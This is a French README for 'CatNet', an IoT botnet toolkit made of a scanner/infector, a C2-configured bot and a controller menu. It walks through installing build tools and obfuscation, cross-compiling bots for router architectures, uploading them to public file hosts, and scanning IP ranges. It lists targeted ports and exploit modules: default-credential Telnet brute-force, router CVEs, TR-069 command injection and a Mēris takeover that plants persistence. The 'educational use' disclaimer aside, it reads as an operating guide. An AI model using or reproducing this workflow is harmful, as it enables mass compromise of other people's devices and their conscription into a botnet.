# CatNet

![CatNet](https://img.shields.io/badge/CatNet-Scanner-red)

> ⚠️ **Usage éducatif et recherche en sécurité uniquement.** Utiliser ces outils sur des systèmes sans autorisation explicite est illégal.

## Vue d'ensemble

CatNet est un framework de scan/infection IoT composé de trois parties :

| Composant | Fichier | Rôle |
|-----------|---------|------|
| Interface principale | `main.py` | Menu interactif, compilation, upload, orchestration |
| Scanner | `fiber.go` | Scan réseau, exploitation, propagation |
| Bot | `bot_discord.go` | Agent installé sur les cibles infectées |

---

## Dépendances — installation manuelle requise

Le programme **ne les installe pas automatiquement**. Toutes ces étapes sont obligatoires.

### 1. Python 3.10+

```bash
sudo apt update && sudo apt install -y python3 python3-pip
```

### 2. Go (1.21+)

Le programme cherche Go dans `/usr/local/go/bin/go`. La version `apt` est souvent trop ancienne.

```bash
# Télécharger et installer Go officiel
wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version   # doit afficher go1.22.x
```

### 3. garble (obfuscateur Go, optionnel)

Requis uniquement si tu actives l'obfuscation dans le menu. garble appelle `go` en interne — Go doit être dans le PATH avant d'installer garble.

```bash
go install mvdan.cc/garble@latest
# Le binaire sera dans ~/go/bin/garble
# Ajouter au PATH si pas déjà fait :
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
source ~/.bashrc
```

### 4. zmap

Requis pour le scan réseau (mode "IP unique" et scans sur plages).

```bash
sudo apt install -y zmap
```

Sur Raspberry Pi / ARM, zmap peut nécessiter une compilation depuis les sources si le paquet apt n'est pas disponible :

```bash
sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
git clone https://github.com/zmap/zmap.git && cd zmap
mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
```

### 5. screen

Requis pour lancer les scans en arrière-plan.

```bash
sudo apt install -y screen
```

### 6. masscan (optionnel)

Alternative à zmap pour les scans rapides.

```bash
sudo apt install -y masscan
```

### 7. curl

Requis pour l'upload des binaires (catbox.moe / transfer.sh / serveur perso).

```bash
sudo apt install -y curl
```

### 8. Compilateurs croisés (pour compiler le bot multi-archi)

```bash
sudo apt install -y \
  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
  gcc-sparc64-linux-gnu gcc-multilib libc6-dev-i386

# Headers manquants (erreur asm/socket.h)
for arch in i386-linux-gnu mips-linux-gnu arm-linux-gnueabi aarch64-linux-gnu \
            powerpc-linux-gnu sh4-linux-gnu m68k-linux-gnu sparc64-linux-gnu; do
  sudo mkdir -p /usr/$arch/include
  sudo ln -sf /usr/include/asm-generic /usr/$arch/include/asm
done
```

---

## Lancement

```bash
sudo python3 main.py
```

> Le programme nécessite les droits root pour zmap/masscan (raw sockets).

---

## Flux de travail typique

1. **Menu principal → [1] Services** pour configurer l'IP C2, le port, le mode de distribution
2. **[2] Compiler les bots** — compile `bot_discord.go` pour toutes les architectures
3. **[3] Upload** — uploade les binaires compilés sur catbox.moe (ou ton serveur)
4. **[4] Compiler fiber** — compile le scanner avec les URLs des bots embarquées
5. **[5] Lancer un scan** — choisir une plage IP ou charger une liste, choisir les ports
6. **[t] Logs IP unique** — voir les logs en direct du scan en cours

---

## Distribution des binaires

Deux modes disponibles dans le menu Services :

| Mode | Description |
|------|-------------|
| `auto` | Upload sur catbox.moe ou transfer.sh. Pas besoin d'IP publique. |
| `local` | fiber sert lui-même les fichiers. Nécessite une IP/port accessible depuis Internet. |

**Serveur perso** : tu peux renseigner l'URL de ton propre serveur d'hébergement. Il doit accepter un POST multipart sur `/upload.php` et retourner `{"success":true,"url":"..."}`.

---

## Ports scannés par défaut

| Port | Service |
|------|---------|
| 80, 8080, 81 | HTTP |
| 443, 8443 | HTTPS |
| 23 | Telnet |
| 7547 | TR-069 (CWMP) |
| 37215 | Huawei HG532 |
| 5000 | UPnP |
| 34567, 9527 | DVR/caméras |
| 2000 | MikroTik bandwidth-test |
| 8291 | MikroTik Winbox |
| 8728 | RouterOS API |
| 5678 | Mēris SOCKS5 |

---

## Modules d'exploitation (fiber.go)

- **Telnet brute-force** — liste de credentials par défaut IoT
- **HTTP exploits** — CVE Realtek, Huawei HG532, D-Link, TP-Link, TOTOLINK, etc.
- **TR-069 / CWMP** — injection de commandes
- **MikroTik** — CVE-2018-14847 (Winbox, RouterOS < 6.42.1), brute API port 8728, SSH
- **Mēris takeover** — détecte SOCKS5 port 5678 → supprime schedulers adverses → injecte persistance

---

## Dépannage

**`garble: can't find Go toolchain`**
Go n'est pas dans le PATH du sous-processus. Vérifier :
```bash
which go   # doit retourner /usr/local/go/bin/go
```

**`screen: command not found`**
```bash
sudo apt install -y screen
```

**`0 Attempted` après plusieurs minutes (scan IP unique)**
zmap n'a trouvé aucune IP sur ce port dans la plage donnée. fiber attend sur stdin et ne s'arrête pas. Tuer manuellement le screen et relancer avec une autre plage ou un autre port.

**Compilation croisée : `asm/socket.h: No such file or directory`**
Voir la section compilateurs croisés ci-dessus (liens symboliques asm-generic).

**Les bots compilés ne s'exécutent pas sur la cible**
Vérifier l'architecture : `file bot.arm` doit correspondre à la cible. Utiliser `bot.mipsle` pour les routeurs MIPS little-endian (Mikrotik CHR, certains TP-Link).

---

## Licence

Usage éducatif uniquement.
